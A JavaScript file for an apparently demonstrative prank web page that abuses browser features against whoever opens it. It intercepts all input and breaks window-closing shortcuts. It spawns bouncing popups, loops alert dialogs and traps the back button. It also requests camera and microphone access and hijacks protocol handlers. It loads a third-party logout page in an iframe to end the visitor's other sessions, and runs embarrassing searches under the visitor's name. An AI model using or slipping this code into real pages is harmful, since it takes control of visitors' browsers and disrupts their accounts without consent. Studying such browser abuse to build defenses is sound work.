/*
  Same as before, but intercept as many shortcuts as possible

  Demo: in Safari

  Also: in Chrome hold down the space key
*/

const SCREEN_WIDTH = window.screen.availWidth
const SCREEN_HEIGHT = window.screen.availHeight
const WINDOW_WIDTH = 480
const WINDOW_HEIGHT = 260
const VELOCITY = 15
const MARGIN = 10
const TICK_LENGTH = 50

const ART = [
`
┊┊ ☆┊┊┊┊☆┊┊☆ ┊┊┊┊┊
┈┈┈┈╭━━━━━━╮┊☆ ┊┊
┈☆ ┈┈┃╳╳╳▕╲▂▂╱▏┊┊
┈┈☆ ┈┃╳╳╳▕▏▍▕▍▏┊┊
┈┈╰━┫╳╳╳▕▏╰┻╯▏┊┊
☆ ┈┈┈┃╳╳╳╳╲▂▂╱┊┊┊
┊┊☆┊╰┳┳━━┳┳╯┊ ┊ ☆┊
`,
`
░░▓▓░░░░░░░░▓▓░░
░▓▒▒▓░░░░░░▓▒▒▓░
░▓▒▒▒▓░░░░▓▒▒▒▓░
░▓▒▒▒▒▓▓▓▓▒▒▒▒▓░
░▓▒▒▒▒▒▒▒▒▒▒▒▒▒▓
▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓
▓▒▒▒░▓▒▒▒▒▒░▓▒▒▓
▓▒▒▒▓▓▒▒▒▓▒▓▓▒▒▓
▓▒░░▒▒▒▒▒▒▒▒▒░░▓
▓▒░░▒▓▒▒▓▒▒▓▒░░▓
░▓▒▒▒▓▓▓▓▓▓▓▒▒▓░
░░▓▒▒▒▒▒▒▒▒▒▒▓░░
░░░▓▓▓▓▓▓▓▓▓▓░░░
`
]

const SEARCHES = [
  'where should i bury the body',
  'why does my eye twitch',
  'why is my poop green',
  'why do i feel so empty',
  'why do i always feel hungry',
  'why do i always have diarrhea',
  'why does my anus itch',
  'why does my belly button smell',
  'why does my cat attack me',
  'why does my dog eat poop',
  'why does my fart smell so bad',
  'why does my mom hate me',
  'why does my pee smell bad',
  'why does my poop float',
  'proof that the earth is flat'
]

/*
 * Use `window.opener` to detect if this window was opened by another window, which
 * will be its parent. The `window.opener` variable is a reference to the parent
 * window.
 */
if (window.opener) initChildWindow()
else initParentWindow()

/*
 * Some code always runs in *both* child and parent windows.
 */
init()

/**
 * Initialization code for child windows.
 */
function initChildWindow () {
  moveWindowBounce()
  showTrollVideo()
}

/**
 * Initialization code for parent windows.
 */
function initParentWindow () {
}

/**
 * Initialization code for *both* parent and child windows.
 */
function init () {
  confirmPageUnload()
  registerProtocolHandlers()
  requestCameraAndMic()
  startAlertInterval()
}

/**
 * Ask the user "are you sure you want to leave this page?"
 */
function confirmPageUnload () {
  window.addEventListener('beforeunload', event => {
    event.returnValue = true
  })
}

/**
 * Attempt to register all possible browser-whitelisted protocols to be handled by
 * this web app instead of their default handlers.
 */
function registerProtocolHandlers () {
  if (typeof navigator.registerProtocolHandler !== 'function') return

  const handlerUrl = window.location.href + '/url=%s'
  navigator.registerProtocolHandler('bitcoin', handlerUrl, 'haha')
  navigator.registerProtocolHandler('geo', handlerUrl, 'haha')
  navigator.registerProtocolHandler('im', handlerUrl, 'haha')
  navigator.registerProtocolHandler('irc', handlerUrl, 'haha')
  navigator.registerProtocolHandler('ircs', handlerUrl, 'haha')
  navigator.registerProtocolHandler('magnet', handlerUrl, 'haha')
  navigator.registerProtocolHandler('mailto', handlerUrl, 'haha')
  navigator.registerProtocolHandler('mms', handlerUrl, 'haha')
  navigator.registerProtocolHandler('news', handlerUrl, 'haha')
  navigator.registerProtocolHandler('ircs', handlerUrl, 'haha')
  navigator.registerProtocolHandler('nntp', handlerUrl, 'haha')
  navigator.registerProtocolHandler('sip', handlerUrl, 'haha')
  navigator.registerProtocolHandler('sms', handlerUrl, 'haha')
  navigator.registerProtocolHandler('smsto', handlerUrl, 'haha')
  navigator.registerProtocolHandler('ssh', handlerUrl, 'haha')
  navigator.registerProtocolHandler('tel', handlerUrl, 'haha')
  navigator.registerProtocolHandler('urn', handlerUrl, 'haha')
  navigator.registerProtocolHandler('webcal', handlerUrl, 'haha')
  navigator.registerProtocolHandler('wtai', handlerUrl, 'haha')
  navigator.registerProtocolHandler('xmpp', handlerUrl, 'haha')
}

/**
 * Attempt to access the user's camera and microphone
 */
function requestCameraAndMic () {
  if (!navigator.mediaDevices ||
      typeof navigator.mediaDevices.getUserMedia !== 'function') {
    return
  }
  navigator.mediaDevices.getUserMedia({
    audio: true, video: true
  }, () => {}, () => {})
}

/**
 * Move the window around the screen and bounce off of the screen edges
 */
function moveWindowBounce () {
  let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
  let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1)

  window.setInterval(() => {
    const x = window.screenX
    const y = window.screenY
    const width = window.outerWidth
    const height = window.outerHeight

    if (x < MARGIN) vx = Math.abs(vx)
    if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx)
    if (y < MARGIN + 20) vy = Math.abs(vy)
    if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy)

    window.moveBy(vx, vy)
  }, TICK_LENGTH)
}

/**
 * Show a random troll video in the window.
 */
function showTrollVideo () {
  const VIDEOS = [
    'nyan.mp4',
    'cat.mp4',
    'trolol.mp4'
  ]

  const video = document.createElement('video')

  video.src = VIDEOS[Math.floor(Math.random() * VIDEOS.length)]
  video.autoplay = true
  video.loop = true

  document.body.appendChild(video)
}

/**
 *
 */
function startAlertInterval () {
  setInterval(() => {
    window.alert(Array(100).join(ART[Math.floor(Math.random() * ART.length)]))
  }, 1000)
}

// Intercept all shortcuts
document.body.addEventListener('mousedown', handleUserInput)
document.body.addEventListener('click', handleUserInput)
document.body.addEventListener('mouseup', handleUserInput)
document.body.addEventListener('keydown', handleUserInput)
document.body.addEventListener('keypress', handleUserInput)
document.body.addEventListener('keyup', handleUserInput)

function handleUserInput (event) {
  focusWindows()
  openWindow()

  requestCameraAndMic()

  const pipVideo = document.querySelector('#pip-video')
  if (pipVideo.webkitSetPresentationMode) {
    pipVideo.muted = false
    pipVideo.webkitSetPresentationMode('picture-in-picture')
  }

  // Prevent default behavior (breaks closing window shortcuts)
  event.preventDefault()
  event.stopPropagation()
}

if (window.opener) {
  // *** RUNS IN CHILD WINDOW: ***

  window.onunload = () => {
    if (!window.opener.closed) window.opener.onCloseWindow(window)
  }
}

if (!window.opener) {
  // *** RUNS IN PARENT WINDOW: ***

  const logoutIframe = document.createElement('iframe')
  logoutIframe.src = 'http://superlogout.com'
  document.body.appendChild(logoutIframe)

  for (let i = 1; i < 20; i++) {
    window.history.pushState({}, '', window.location.pathname + '?q=' + i)
  }
  window.history.pushState({}, '', window.location.pathname)
  window.addEventListener('popstate', () => {
    window.history.forward()
  })


}

// *** RUNS IN PARENT AND CHILD WINDOWS: ***

// Track created windows in an array
let wins = []

function openWindow () {
  const { x, y } = getRandomCoords()

  const win = window.open(window.location.pathname, '', `width=${WINDOW_WIDTH},height=${WINDOW_HEIGHT},left=${x},top=${y}`)
  if (!win) return

  if (wins.length === 1) {
    setupSearchWindow(win)
  }

  wins.push(win)
}

function getRandomCoords () {
  const x = MARGIN + Math.floor(Math.random() * (SCREEN_WIDTH - WINDOW_WIDTH - MARGIN))
  const y = MARGIN + Math.floor(Math.random() * (SCREEN_HEIGHT - WINDOW_HEIGHT - MARGIN))
  return { x, y }
}

function setupSearchWindow (win) {
  if (!win) return
  win.window.location = 'http://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[0])
  let searchIndex = 1
  let interval = setInterval(() => {
    if (searchIndex >= SEARCHES.length) {
      clearInterval(interval)
      win.window.location = window.location.pathname
      return
    }

    if (win.closed) {
      clearInterval(interval)
      onCloseWindow(win)
      return
    }

    win.window.location = window.location.pathname
    setTimeout(() => {
      const { x, y } = getRandomCoords()
      win.moveTo(x, y)
      win.window.location = 'http://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex])
      searchIndex += 1
    }, 500)
  }, 2500)
}

function focusWindows () {
  wins.forEach(win => {
    if (win.focus) win.focus()
  })
}

function onCloseWindow (win) {
  const i = wins.indexOf(win)
  if (i >= 0) wins.splice(i, 1)
}
